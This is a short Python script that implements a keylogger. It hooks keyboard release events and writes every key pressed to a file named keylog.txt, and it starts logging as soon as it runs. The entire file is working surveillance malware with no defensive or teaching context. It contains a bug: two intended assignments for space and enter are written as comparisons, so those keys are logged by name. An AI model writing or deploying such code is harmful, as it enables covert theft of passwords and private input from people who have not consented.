import keyboard

class KeyLogger():
    def __init__(self,Secret_Keys):
        self.out_file=open(Secret_Keys,"w")
    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
    def callback(self,event):
        button=event.name
        if button=="space":
            button==" "
        if button=="enter":
            button=="\n"
        self.out_file.write(button)
        self.out_file.flush()
    
i=KeyLogger("keylog.txt")
i.start_log()
